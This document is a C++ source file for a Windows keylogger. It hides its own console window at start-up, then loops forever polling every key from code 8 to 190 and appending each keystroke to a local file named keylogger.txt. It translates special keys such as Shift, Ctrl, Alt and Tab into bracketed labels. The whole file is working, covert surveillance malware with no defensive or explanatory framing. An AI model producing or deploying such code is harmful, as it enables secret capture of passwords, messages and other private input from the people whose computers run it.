#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

#define LOG_FILE "keylogger.txt"

void saveData(std::string data) {
    std::fstream logFile;


    logFile.open(LOG_FILE, std::ios::app);

    logFile << data;

    logFile.close();
}

// Translate special key int into string
std::string translateSpecialKey(int key) {
    std::string result;

    switch (key)
    {
    case VK_SPACE:
        /* code */
        result = " ";
        break;
    case VK_RETURN:
        /* code */
        result = "\n";
        break;
    case VK_BACK:
        /* code */
        result = "\b";
        break;
    case VK_CAPITAL:
        /* code */
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        /* code */
        result = "[SHIFT]";
        break;
    case VK_TAB:
        /* code */
        result = "[TAB]";
        break;
    case VK_CONTROL:
        /* code */
        result = "[CTRL]";
        break;
    case VK_MENU:
        /* code */
        result = "[ALT]";
        break;
    
    default:
        break;
    }

    return result;
}

int main() {

    int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB,VK_CONTROL, VK_MENU, VK_CAPITAL};
    std::string specialKeyChar;
    bool isSpecialKey;


    // Hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Loop forever
    while (true) {
        // Loop through each key
        for (int key = 8; key <= 190; key++) {
            // Check key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Key is pressed
                // Check if key is special key
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                if (isSpecialKey) {
                    // This is a special key. We need to translate it!
                    specialKeyChar = translateSpecialKey(key);
                    // Save data
                    saveData(specialKeyChar);
                } else {
                    // this is not a special key. We need to check if it is uppercase or lowercase
                    if (GetKeyState(VK_CAPITAL)) {
                        // CAPSLOCK is on
                        saveData(std::string(1, (char)key));
                    } else {
                        // CAPSLOCK is off
                        // Turn the character into lowercase before saving
                        saveData(std::string(1, (char)std::tolower(key)));
                    }
                }
            }
        }
    }

    return 0;
}